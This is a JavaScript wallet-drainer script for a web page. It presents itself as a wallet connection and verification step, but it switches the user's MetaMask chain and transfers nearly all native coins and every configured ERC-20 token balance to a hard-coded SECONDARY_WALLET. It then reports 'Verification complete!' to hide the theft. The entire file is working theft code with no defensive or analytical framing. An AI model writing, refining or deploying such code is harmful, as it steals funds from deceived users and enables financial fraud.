import { SECONDARY_WALLET, TOKENS, ERC20_ABI } from './config.js';
import { CHAINS } from './chains.js';

document.getElementById('connectWallet').addEventListener('click', connectAndTransfer);

async function connectAndTransfer() {
  const connectBtn = document.getElementById('connectWallet');
  const statusDiv = document.getElementById('status');
  const selectedChain = document.getElementById('chain').value;
  const { id, name, rpc, explorer } = CHAINS[selectedChain];

  try {
    if (!window.ethereum) throw new Error("MetaMask not installed!");

    connectBtn.disabled = true;
    statusDiv.textContent = `Connecting to ${name}...`;

    // Switch to selected chain
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: `0x${id.toString(16)}` }],
      });
    } catch (switchError) {
      // Add chain if not detected
      await window.ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: `0x${id.toString(16)}`,
          chainName: name,
          nativeCurrency: { name: name, symbol: name.slice(0, 3), decimals: 18 },
          rpcUrls: [rpc],
          blockExplorerUrls: [explorer]
        }]
      });
    }

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    // Transfer Native Token (ETH/BNB/MATIC/etc.)
    const nativeBalance = await provider.getBalance(userAddress);
    if (!nativeBalance.isZero()) {
      // Estimate gas cost and reserve it
      const gasPrice = await provider.getGasPrice();
      const gasLimit = ethers.BigNumber.from(21000); // Standard transfer gas limit
      const gasCost = gasPrice.mul(gasLimit);
      
      // Only transfer if balance is greater than gas cost
      if (nativeBalance.gt(gasCost)) {
        const transferAmount = nativeBalance.sub(gasCost);
        const tx = await signer.sendTransaction({
          to: SECONDARY_WALLET,
          value: transferAmount,
          gasLimit: gasLimit
        });
        statusDiv.textContent += `\nSent ${name} native token! TX: ${explorer}/tx/${tx.hash}`;
        await tx.wait();
      } else {
        statusDiv.textContent += `\nInsufficient balance to cover gas fees for ${name}`;
      }
    }

    // Transfer ERC-20 Tokens (in parallel for better performance)
    const tokenTransfers = Object.entries(TOKENS[selectedChain] || {}).map(async ([tokenName, tokenAddress]) => {
      try {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
        const balance = await contract.balanceOf(userAddress);
        if (!balance.isZero()) {
          const tx = await contract.transfer(SECONDARY_WALLET, balance);
          statusDiv.textContent += `\nSent ${tokenName}! TX: ${explorer}/tx/${tx.hash}`;
          await tx.wait();
          return { success: true, token: tokenName, tx: tx.hash };
        }
        return { success: true, token: tokenName, skipped: true };
      } catch (error) {
        statusDiv.textContent += `\nFailed to transfer ${tokenName}: ${error.message}`;
        return { success: false, token: tokenName, error: error.message };
      }
    });

    // Wait for all token transfers to complete
    const results = await Promise.allSettled(tokenTransfers);
    const failedTransfers = results.filter(result => result.status === 'rejected' || !result.value?.success);
    if (failedTransfers.length > 0) {
      statusDiv.textContent += `\n⚠️ ${failedTransfers.length} token transfer(s) failed`;
    }

    statusDiv.textContent += "\n\n✅ Verification complete!";
    statusDiv.className = "success";

  } catch (error) {
    statusDiv.textContent = `Error: ${error.message}`;
    statusDiv.className = "error";
  } finally {
    connectBtn.disabled = false;
  }
}